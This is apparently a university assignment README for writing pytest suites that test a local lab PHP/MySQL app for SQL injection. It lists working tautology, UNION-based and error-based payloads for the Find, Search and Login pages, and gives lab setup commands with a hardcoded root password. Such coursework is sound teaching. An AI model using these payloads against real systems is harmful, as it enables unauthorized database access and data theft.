# Second Assignment - SQL Injections

## Instructions
In this assignment, you will build a new test suite that tests the target application for Union-based SQL Injections, similar to the one you built in Assignment 1.

While in Assignment 1 you could use plain Python for your test suite, for this assignment you will use pytest to organize and run your tests steps.

This is very similar to using plain Python: you can create tests as simple Python functions, but the name of the function must always start with "test_". Also, these functions should be in a Python file, which must also have a name that starts with "test_".

If you structure your code like this, you should only need to install pytest (pip install pytest) and run the "pytest" command from the folder that contains these files. Tests will be automatically run.

Notice that you can "assert False" if you want to make the test fail, but you can have implicit success for tests (or you can also specify "assert True")

### Environment Setup
My credentials:
```
$mysql_server = "172.17.0.2"; // or any host on which you deployed it
$mysql_user = "root";
$mysql_pass = "pass"; // The password you set up during installation
```

You can now populate your MySQL instance:
```
sudo docker run --name mysql-container -e MYSQL_ROOT_PASSWORD=pass -p 3006:3306 mysql


mysql -h 172.17.0.2 -u root --password=pass < ./Seed/create-database.sql
mysql -h 172.17.0.2 -u root --password=pass fstt23_assignment < ./Seed/create-users.sql
mysql -h 172.17.0.2 -u root --password=pass fstt23_assignment < ./Seed/create-items.sql
cd Application && php -S localhost:9000
```

### Testing
For each page of the target application, you should design and implement a test step that checks:

- if the page is working correctly (e.g., for login pages, that the login is working correctly)
- if the page is vulnerable to: 
    - Standard SQL injection (additional).
    - Union-based SQL injection.
    - Error-based SQL injection.
    - Boolean Based SQL injection (additional).
    - Time Based SQL injection (additional).

Tests should take into account all possible variants of syntax and insufficient sanitization that could be applied to the page.


### Find{,3}
Functional: $search = Apple
Oracle: Apple

Standard: $search = ' OR 1 LIMIT 0,1 -- - 
Oracle: Apple

Union: $search = ' UNION ALL SELECT USER(), USER() -- - 
Oracle: root

Error: ' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - 
Oracle: root

### Find{2}
Functional: $search = Apple
Oracle: Apple

Standard: $search = " OR 1 LIMIT 0,1 -- - 
Oracle: Apple

Union: $search = " UNION ALL SELECT USER(), USER() -- - 
Oracle: root

Error: " AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - 
Oracle: root

## General Payloads for Find
Functional: $search = Apple
Oracle: Apple

Standard: $search = {',"} OR 1 LIMIT 0,1 -- - 
Oracle: Apple

Union: $search = {',"} UNION ALL SELECT USER(), USER() -- - 
Oracle: root

Error: {',"} AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - 
Oracle: root

### Search
Functional: $max = 100
Oracle: "Apple" for {,2,4} and "3.00 €" for {3}

Standard: $max = 1 UNION ALL SELECT USER() AS name, USER() AS price -- - 
Oracle: "Apple"

Union: $max = 1 UNION ALL SELECT USER() AS name, USER() AS price -- -
Oracle: root

Error: $max = 1 AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -
Oracle: root

### Login
!! POST REQUESTS !!

Functional: $user=any, $pass=password
Oracle: "Welcome"

Standard: $user=any, $pass=' OR 1 LIMIT 0,1 -- -
Oracle: "Welcome"

Union: $user=any, $pass=' UNION ALL SELECT USER(),USER(),USER(),USER() -- - 
Oracle: root

Error: $user=any, $pass=' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- -
Oracle: root

## Confirmation step
One easy way to confirm that the attack was successful is to retrieve the MySQL version via the VERSION() SQL function, or the user for the current connection, which can be retrieved via the USER() function. Of course, you can use any other value you prefer to confirm the exploit.